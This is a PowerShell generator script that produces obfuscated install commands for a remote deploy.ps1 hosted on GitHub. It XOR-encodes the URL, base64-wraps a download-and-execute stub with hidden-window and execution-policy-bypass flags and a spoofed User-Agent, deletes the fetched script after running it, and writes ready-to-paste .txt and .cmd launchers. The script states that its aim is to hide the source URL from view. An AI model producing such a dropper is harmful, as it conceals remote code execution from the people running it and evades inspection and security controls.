# Generates obfuscated one-liner install commands (hides GitHub URL from plain view)

param(
    [string]$GitHubBaseUrl = ""
)

$configPath = Join-Path $PSScriptRoot "config.json"
if ([string]::IsNullOrWhiteSpace($GitHubBaseUrl) -and (Test-Path $configPath)) {
    $GitHubBaseUrl = (Get-Content $configPath -Raw | ConvertFrom-Json).GitHubBaseUrl
}

if ([string]::IsNullOrWhiteSpace($GitHubBaseUrl) -or ($GitHubBaseUrl -match "YOUR_USER")) {
    Write-Host "ERROR: Set GitHubBaseUrl in deploy\config.json" -ForegroundColor Red
    exit 1
}

$repoRoot = Split-Path $PSScriptRoot -Parent
$commit = $null
try {
    $commit = (git -C $repoRoot rev-parse HEAD 2>$null).Trim()
} catch {
    $commit = $null
}

$deployBase = $GitHubBaseUrl
if ($commit) {
    $deployBase = $GitHubBaseUrl -replace "/main/", "/$commit/"
    Write-Host "Pinned deploy URL to commit: $commit" -ForegroundColor Gray
}

$deployUrl = "$deployBase/deploy.ps1".Replace('\', '/')
$key = 0xA7
$urlBytes = [Text.Encoding]::UTF8.GetBytes($deployUrl)
$encodedBytes = $urlBytes | ForEach-Object { $_ -bxor $key }
$byteList = ($encodedBytes | ForEach-Object { "0x{0:X2}" -f $_ }) -join ","

$innerScript = @"
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
`$k=$key
`$b=@($byteList)
`$u=[Text.Encoding]::UTF8.GetString([byte[]](`$b|ForEach-Object{`$_ -bxor `$k}))
`$c=New-Object Net.WebClient
`$c.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
`$p=Join-Path `$env:TEMP ('wr_'+[guid]::NewGuid().ToString('N')+'.ps1')
[IO.File]::WriteAllText(`$p,`$c.DownloadString(`$u))
& `$p
Remove-Item `$p -Force -ErrorAction SilentlyContinue
"@

$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($innerScript))
$obfuscatedCmd = "powershell -nop -w hidden -ep bypass -enc $encodedCommand"

$plainCmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command ""iex ((New-Object Net.WebClient).DownloadString('$deployUrl'))"""

Write-Host "========================================" -ForegroundColor Green
Write-Host " Obfuscated Install Command" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "Obfuscated (use this):" -ForegroundColor Cyan
Write-Host $obfuscatedCmd -ForegroundColor White
Write-Host ""
Write-Host "Plain (reference only):" -ForegroundColor DarkGray
Write-Host $plainCmd -ForegroundColor DarkGray
Write-Host ""

$outDir = Join-Path (Split-Path $PSScriptRoot -Parent) "build\github"
if (-not (Test-Path $outDir)) {
    $outDir = $PSScriptRoot
}

Set-Content -Path (Join-Path $outDir "install_obfuscated.txt") -Value $obfuscatedCmd -Encoding ASCII
Set-Content -Path (Join-Path $outDir "install_obfuscated.cmd") -Value "@echo off`r`n$obfuscatedCmd" -Encoding ASCII
Set-Content -Path (Join-Path $PSScriptRoot "install_obfuscated.txt") -Value $obfuscatedCmd -Encoding ASCII

$localCmd = "@echo off`r`npowershell -nop -w hidden -ep bypass -File `"%~dp0deploy.ps1`""
Set-Content -Path (Join-Path $PSScriptRoot "install_obfuscated.cmd") -Value $localCmd -Encoding ASCII
Set-Content -Path (Join-Path $outDir "install_obfuscated.cmd") -Value $localCmd -Encoding ASCII

Write-Host "Saved: deploy\install_obfuscated.txt (remote, obfuscated)" -ForegroundColor Green
Write-Host "Saved: deploy\install_obfuscated.cmd (local, runs deploy.ps1)" -ForegroundColor Green
